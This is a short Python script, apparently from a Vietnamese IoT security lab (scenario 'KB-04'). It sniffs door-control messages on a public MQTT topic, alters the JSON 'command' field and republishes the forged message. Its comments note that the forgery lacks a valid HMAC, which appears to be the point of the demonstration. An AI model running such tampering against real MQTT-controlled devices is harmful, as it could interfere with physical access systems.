import paho.mqtt.client as mqtt
import json
import time

BROKER = "test.mosquitto.org"
PORT = 1883
TOPIC = "iot/door/control"
attack_done = False

def on_message(client, userdata, msg):
    global attack_done
    if attack_done: return

    payload = msg.payload.decode('utf-8')
    print("\n==================================================")
    print(f"[!] BẮT ĐƯỢC GÓI TIN GỐC:")
    print(payload)
    
    try:
        data = json.loads(payload)
        print("\n[*] (KB-04) Đang tiến hành giả mạo lệnh (Command Tampering)...")
        
        # Kẻ tấn công cố tình sửa đổi nội dung lệnh
        data['command'] = "LOCK_FAKE"
        
        # Đóng gói lại thành JSON (nhưng không thể tính lại HMAC do không có Secret Key)
        fake_payload = json.dumps(data)
        
        print(f"[=>] ĐANG GỬI GÓI TIN GIẢ MẠO:")
        print(fake_payload)
        client.publish(TOPIC, fake_payload)
        print("==================================================")
        
        attack_done = True
        time.sleep(1)
        client.disconnect()
    except json.JSONDecodeError:
        print("[-] Lỗi: Không thể phân tích JSON.")

client = mqtt.Client()
client.on_message = on_message

try:
    client.connect(BROKER, PORT, 60)
    client.subscribe(TOPIC)
    print("--- KHỞI ĐỘNG ATTACKER (KB-04: COMMAND TAMPERING) ---")
    print(f"[*] Đang lắng nghe trên topic: {TOPIC}...")
    client.loop_forever()
except KeyboardInterrupt:
    print("\n[*] Tắt công cụ tấn công.")
